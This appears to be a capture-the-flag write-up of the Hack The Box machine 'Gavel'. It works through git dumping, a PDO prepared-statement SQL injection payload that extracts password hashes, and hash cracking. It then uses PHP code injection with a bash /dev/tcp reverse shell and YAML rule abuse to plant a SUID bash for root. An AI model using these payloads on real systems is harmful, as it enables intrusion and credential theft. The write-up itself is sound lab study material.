- - - 
created : 30-11-2025 

Tags : #medium 

Released on 29 Nov 2025 (Season 9)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Gavel/user]
└─$ rustscan -a gavel.htb -- -A 
Open 10.10.11.97:22
Open 10.10.11.97:80
<SNIP>
```
# Enumeration
## HTTP (80)

Register your account.
### Dirsearch

We can use [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Gavel/user]
└─$ dirsearch -u http://gavel.htb

[11:11:24] Starting:                                                                                  
[11:11:28] 301 -  305B  - /.git  ->  http://gavel.htb/.git/                 
[11:11:29] 200 -  407B  - /.git/branches/                                   
[11:11:29] 200 -    3B  - /.git/COMMIT_EDITMSG                              
[11:11:29] 200 -   23B  - /.git/HEAD                                        
[11:11:29] 200 -  136B  - /.git/config                                      
[11:11:29] 200 -   73B  - /.git/description                                 
[11:11:29] 200 -  616B  - /.git/                                            
[11:11:29] 200 -  670B  - /.git/hooks/                                      
[11:11:29] 301 -  321B  - /.git/logs/refs/heads  ->  http://gavel.htb/.git/logs/refs/heads/
[11:11:29] 301 -  316B  - /.git/refs/heads  ->  http://gavel.htb/.git/refs/heads/
[11:11:29] 301 -  315B  - /.git/logs/refs  ->  http://gavel.htb/.git/logs/refs/
[11:11:29] 200 -  240B  - /.git/info/exclude
[11:11:29] 200 -  454B  - /.git/info/                                       
[11:11:29] 200 -  422B  - /.git/logs/HEAD
[11:11:29] 200 -   41B  - /.git/refs/heads/master                           
[11:11:29] 200 -  219KB - /.git/index
[11:11:29] 200 -  422B  - /.git/logs/refs/heads/master
[11:11:29] 200 -  486B  - /.git/logs/
[11:11:29] 200 -  467B  - /.git/refs/
[11:11:30] 301 -  315B  - /.git/refs/tags  ->  http://gavel.htb/.git/refs/tags/
[11:11:31] 403 -  274B  - /.ht_wsr.txt                                      
[11:11:31] 403 -  274B  - /.htaccess.orig                                   
[11:11:31] 403 -  274B  - /.htaccess.bak1                                   
[11:11:31] 403 -  274B  - /.htaccess.save
[11:11:31] 403 -  274B  - /.htaccess.sample
[11:11:31] 403 -  274B  - /.htaccess_extra                                  
[11:11:31] 403 -  274B  - /.htaccess_orig
[11:11:31] 403 -  274B  - /.htaccessOLD
[11:11:31] 403 -  274B  - /.htaccessBAK
[11:11:31] 403 -  274B  - /.htaccess_sc
[11:11:31] 403 -  274B  - /.htaccessOLD2
[11:11:31] 403 -  274B  - /.html                                            
[11:11:31] 403 -  274B  - /.htm
[11:11:32] 403 -  274B  - /.htpasswds                                       
[11:11:32] 403 -  274B  - /.htpasswd_test
[11:11:32] 403 -  274B  - /.httr-oauth
[11:11:32] 200 -    2KB - /.git/objects/
[11:11:33] 403 -  274B  - /.php                                             
[11:11:37] 302 -    0B  - /admin.php  ->  index.php                         
[11:11:45] 301 -  307B  - /assets  ->  http://gavel.htb/assets/             
[11:11:45] 200 -  515B  - /assets/                                          
[11:12:08] 403 -  274B  - /includes/                                        
[11:12:08] 301 -  309B  - /includes  ->  http://gavel.htb/includes/
[11:12:11] 200 -    3KB - /index.php                                        
[11:12:11] 200 -    3KB - /index.php/login/
[11:12:16] 200 -    1KB - /login.php                                        
[11:12:16] 302 -    0B  - /logout.php  ->  index.php                        
[11:12:30] 200 -    1KB - /register.php                                     
[11:12:31] 403 -  274B  - /server-status                                    
[11:12:31] 403 -  274B  - /server-status/                                   
                                                                             
Task Completed      
```

![Pasted image 20251130111247.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251130111247.png)

We have `.git` and `admin.php` interesting.
  
When the `/.git` path is exposed, we can use `git-dumper` to download the entire Git repository for the deployed web-app:

```bash
git clone https://github.com/arthaud/git-dumper.git

./git_dumper.py http://gavel.htb/.git/ ../gavel-git
```

We can find everything about the site, make sure to look at all the code:

```bash
└─$ ls
admin.php  bidding.php  index.php      login.php   register.php
assets     includes     inventory.php  logout.php  rules
```
## FFuf

Use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for subdomain enumeration:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Gavel/user]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.gavel.htb' -u http://gavel.htb -fs 300-325 -c
```

Nothing here.

We can win bids in `bidding.php` (we have 50'000 credits), the items will be in `inventory.php`
## Caido

Use [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) or [BurpSuite](../../../3%20-%20Tags/Hacking%20Tools/BurpSuite.md) to intercept the request on `inventory.php`:

```html
HTTP/1.1 200 OK

                   Your inventory.
                    </div>
                </div>
                <form action="" method="POST" class="form-inline" id="sortForm">
                    <label for="sort" class="mr-2 text-dark"><strong>Sort by:</strong></label>
                    <input type="hidden" name="user_id" value="3">
                    <select name="sort" id="sort" class="form-control form-control-sm mr-2" onchange="document.getElementById('sortForm').submit();">
                        <option value="item_name" selected>Name</option>
                        <option value="quantity">Quantity</option>
                    </select>
                </form>
            </div>
            <div class="row"
```

We have 2 parameters `user_id` and `sort`, my `user_id` is 3, we can `sort` by quantity or name, try [Local File Inclusion (LFI)](../../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) and [Remote File Inclusion (RFI)](../../../3%20-%20Tags/Hacking%20Concepts/Remote%20File%20Inclusion%20(RFI).md) first.

We can spot [SQL Injection](../../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md) vulnerability in the parameters (URL encode payloads):

single quote
```bash
?user_id=3&sort=quantity'
```

comment
```bash
?user_id=3&sort=quantity' --
```

Boolean
```bash
?user_id=3&sort=quantity' OR '1'='1
?user_id=3&sort=quantity' AND '1'='0
```

Adding a single quote `'` result in a `200` but items don't appear anymore, very likely a SQL error;
Adding a comment does the same;
Using boolean doesn't show items in both cases.

Numeric or string:

```bash
sort=quantity OR 1=1 --       sort=quantity%20OR%201%3D1%20--
sort=OR 1=1 --                sort=%20OR%201%3D1%20--
```

No site collapse,`200` -> Numeric

Boolean Numeric Test

```bash
?user_id=3&sort=sort=OR 1=1 --  # items
?user_id=3&sort=sort=AND 1=0 -- # No items
```

Empty inventory with both.

`user_id`:

```bash
user_id=3'           # show items
user_id=3'-- -       # show items
user_id=3 AND 1=1    # show
user_id=3 AND 1=0    # show
user_id=3 AND sleep(5)-- -  # show
```
# Exploit
## SQL Injection - PDO Bypass

We have [SQL Injection](../../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md) in `GET /inventory.php?user_id=3&sort=quantity`

**MUST STUDY** :         https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/

The extracted code logic is:

```bash
$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";

$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
$stmt->execute([$userId]);
```

- The `sort` parameter is wrapped in backticks with backticks stripped
- The `user_id` parameter uses PDO prepared statements with `?` placeholder
- Traditional SQL injection appears blocked

**Working Payload:**

```go
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```

**URL Decoded:**

```go
user_id=x` FROM (SELECT group_concat(username,0x3a,password) AS `'x` FROM users)y;-- -
sort=\?;-- -%00
```

1. **`\?` breaks PDO parameter detection** - PDO scans for `?` placeholders before parsing MySQL syntax. The backslash causes PDO to treat `\?` as an escaped literal, miscounting parameters.
2. **`%00` null byte** - Causes C-level string truncation in the MySQL driver, breaking prepared statement binding.
3. **Parameter binding fails** - The `user_id` value is no longer safely bound and gets interpreted as raw SQL.
4. **Subquery executes** - Returns concatenated credentials displayed as inventory items.

Extracted credentials:

![Pasted image 20251130140629.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251130140629.png)

```go
auctioneer: HTB{REDACTED_HASH} 
admin:HTB{REDACTED_HASH} 
```

Crack it with [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) or [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Gavel/user]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
HTB{REDACTED_PASSWD}     (auctioneer)     
1g 0:00:00:10 DONE (2025-11-30 14:09) 0.09165g/s 287.0p/s 287.0c/s 287.0C/s iamcool..tottenham
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## Admin Panel

We can use the credentials to access the admin panel:

![Pasted image 20251130141634.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020251130141634.png)

Now we can exploit Arbitrary Code Execution:

`admin.php`

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $auction_id = intval($_POST['auction_id'] ?? 0);
    $rule    = trim($_POST['rule'] ?? '');
    $message = trim($_POST['message'] ?? '');

    if ($auction_id > 0 && (empty($rule) || empty($message))) {
        $stmt = $pdo->prepare("SELECT rule, message FROM auctions WHERE id = ?");
        $stmt->execute([$auction_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        ...
        if (empty($rule))    $rule = $row['rule'];
        if (empty($message)) $message = $row['message'];
    }

    if ($auction_id > 0 && $rule && $message) {
        $stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
        $stmt->execute([$rule, $message, $auction_id]);
        $_SESSION['success'] = 'Rule and message updated successfully!';
        header('Location: admin.php');
        exit;
    }
}
```
  
Here rule is an arbitrary string in the DB we fully control, to trigger **RCE**:

```go
auction_id must be valid
bid_amount>0
bid_amount>price
```

We can overwrite the rule and message fields of any active auction, since rule is injected into a runtime function body via `runkit_function_add()`, we can execute arbitrary PHP.

Open a listener:

```bash
└─$ nc -lvp 1337           
listening on [any] 1337 ...
```

Substitute in `Edit rule`:

```php
system('bash -c "bash -i >& /dev/tcp/10.10.xx.xx/1337 0>&1"'); 
return true;
```
  
Then bid the chosen auction from `bidding.php`, remember the `amount > current price`

Check listener:

```bash
└─$ nc -lvp 1337           
listening on [any] 1337 ...
connect to [10.10.14.75] from gavel.htb [10.10.11.97] 53418
bash: cannot set terminal process group (1001): Inappropriate ioctl for device
bash: no job control in this shell
 
www-data@gavel:/var/www/html/gavel/includes$ su auctioneer
su auctioneer
Password: midnight1

cd ~ 
ls
user.txt
cat user.txt
   HTB{REDACTED_FLAG}
```

User flag obtained, perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md):

```bash
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
auctioneer@gavel:~$ ^Z
zsh: suspended  nc -lvp 1337

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Gavel/user]
└─$ stty raw -echo;fg                 
[1]  + continued  nc -lvp 1337
                              reset
```
# Privilege Escalation

Check `sudo` privileges:

```bash
auctioneer@gavel:~$ sudo -l
[sudo] password for auctioneer: 
Sorry, user auctioneer may not run sudo on gavel.

auctioneer@gavel:~$ id
uid=1001(auctioneer) gid=1002(auctioneer) groups=1002(auctioneer),1001(gavel-seller)
```

We are in `gavel-seller` group.

Using [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) this file stands out:

```go
auctioneer@gavel:~$ ls -la /usr/local/bin
total 28
drwxr-xr-x  2 root root          4096 Oct  3 19:35 .
drwxr-xr-x 10 root root          4096 Sep 11  2024 ..
-rwxr-xr-x  1 root gavel-seller 17688 Oct  3 19:35 gavel-util
```
  
Owned by `root`, this binary is the privilege escalation path.

Try to run the binary:

```bash
auctioneer@gavel:~$ gavel-util 
Usage: /usr/local/bin/gavel-util <cmd> [options]
Commands:
  submit <file>           Submit new items (YAML format)
  stats                   Show Auction stats
  invoice                 Request invoice

```

Create a custom `ini.yaml` and submit it:

```bash
auctioneer@gavel:/tmp$ cat > /tmp/hackini.yaml << 'EOF'
name: "hackini"
description: "None"
image: "https://y"
price: 1
rule_msg: "config updated"
rule: "
file_put_contents(
    '/opt/gavel/.config/php/php.ini',
    \"engine=On\n\" .
    \"display_errors=On\n\" .
    \"display_startup_errors=On\n\" .
    \"log_errors=Off\n\" .
    \"error_reporting=E_ALL\n\" .
    \"open_basedir=/\n\" .
    \"disable_functions=\n\" .
    \"scan_dir=\n\" .
    \"allow_url_fopen=Off\n\" .
    \"allow_url_include=Off\n\"
);
return false;
"
EOF

auctioneer@gavel:/tmp$ gavel-util submit /tmp/hackini.yaml
Item submitted for review in next auction
EOF
```

Create the `root.yaml` file and the `bsh` for the root shell, then submit it:

```bash
# setuid rule
cat > /tmp/root.yaml << 'EOF'
name: "root"
description: "SUID Bash"
image: "https://y"
price: 1
rule_msg: "ok"
rule: "
system('cp /bin/bash /home/auctioneer/bsh');
system('chmod 4755 /home/auctioneer/bsh');
return false;
"
EOF

# bsh
cat > /tmp/root.yaml << 'EOF'
name: "root"
description: "SUID Bash"
image: "https://y"
price: 1
rule_msg: "ok"
rule: "
system('install -o root -m 4755 /bin/bash /home/auctioneer/bsh');
return false;
"
EOF

# submit
gavel-util submit /tmp/root.yaml

auctioneer@gavel:/tmp$ cd ~
auctioneer@gavel:~$ ls
bsh  user.txt
auctioneer@gavel:~$ ./bsh -p
bsh-5.1# cat /root/root.txt
   HTB{REDACTED_FLAG}
```

Pwned !!